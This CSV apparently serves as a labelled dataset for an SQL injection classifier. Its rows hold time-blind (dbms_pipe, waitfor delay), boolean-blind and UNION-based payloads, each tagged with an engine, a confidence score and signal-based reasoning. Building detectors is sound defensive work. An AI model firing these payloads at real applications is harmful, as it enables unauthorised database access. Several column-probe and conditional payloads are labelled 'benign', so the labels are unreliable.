id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
23484,"1 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) # tsxs",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
23548,"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 'ekqv' = 'ekqv",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
23565,"1%' ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
23580,"1%"" ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
23411,"-3930%"" ) ) order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 23 chars.,2
23439,-7277 ) ) ) order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 23 chars.,2
23448,"iif ( 5257 = 5257,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
23510,( case when 8422 = 8452 then 1 else null end ),benign,generic,0.9,Signals: 'case'. Payload length: 46 chars.,2
23520,-2530%' order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 19 chars.,2
23549,"1"" ) as ghpx where 2873 = 2873 waitfor delay '0:0:5'--",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23593,"-7808"" ) ) as jgkk where 9230 = 9230 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
23402,"-7016%"" ) ) union all select 8847,8847,8847--",union_based,generic,0.7,UNION-based payload detected. Payload length: 45 chars.,2
23403,"-8124 ) union all select 7251,7251,7251#",union_based,generic,0.7,UNION-based payload detected. Payload length: 40 chars.,2
23406,1%' ) and 9226 = 7542--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
23407,"-2803' ) as jciy where 1130 = 1130 or make_set ( 4599 = 6550,6550 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 70 chars.,2
23409,"1 where 8949 = 8949 and make_set ( 8403 = 8403,8899 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 56 chars.,2
23419,"-8491"" where 9043 = 9043 union all select 9043,9043,9043,9043,9043,9043,9043,9043,9043--",union_based,generic,0.7,UNION-based payload detected. Payload length: 88 chars.,2
23421,1' ) ) ) and 7533 = 7533 and ( ( ( 'hoyw' = 'hoyw,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 49 chars.,2
23422,"-1844' ) union all select 9572,9572,9572,9572#",union_based,generic,0.7,UNION-based payload detected. Payload length: 46 chars.,2
23425,"-4811' ) ) ) union all select 4603,4603,4603,4603,4603,4603,4603,4603,4603--",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
23432,1%' ) ) ) union all select null#,union_based,generic,0.7,UNION-based payload detected. Payload length: 32 chars.,2
23434,"1' union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
23435,"1 ) ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
23437,1 and 7533 = 7533# absp,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
23443,"-5903%' ) union all select 8293,8293,8293,8293,8293,8293,8293,8293#",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
23446,"-8245"" ) ) or 3038 = 3038",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
23451,"1%"" ) union all select null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 39 chars.,2
23453,"-2803"" ) union all select 5337,5337,5337,5337,5337,5337,5337#",union_based,generic,0.7,UNION-based payload detected. Payload length: 61 chars.,2
23454,"-6775"" union all select 7484,7484#",union_based,generic,0.7,UNION-based payload detected. Payload length: 34 chars.,2
23456,"-5420' ) union all select 2508,2508,2508,2508,2508,2508,2508#",union_based,generic,0.7,UNION-based payload detected. Payload length: 61 chars.,2
23457,"1' in boolean mode ) union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
23458,-8760 ) where 8277 = 8277 union all select 8277--,union_based,generic,0.7,UNION-based payload detected. Payload length: 49 chars.,2
23463,-4055' ) ) as yoez where 3816 = 3816 or ( 8459 = 8459 ) *4906--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 63 chars.,2
23464,"1 ) ) ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
23470,"1 ) ) union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 38 chars.,2
23472,"1'|| ( select 'neqi' where 6873 = 6873 union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 92 chars.,2
23483,"-2125"" ) ) or 8571 = 8571--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2
23487,"-1634%' union all select 5937,5937,5937,5937--",union_based,generic,0.7,UNION-based payload detected. Payload length: 46 chars.,2
23489,"1%"" union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,2
23496,"1%"" union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
23497,"-7637"" union all select 8498,8498,8498--",union_based,generic,0.7,UNION-based payload detected. Payload length: 40 chars.,2
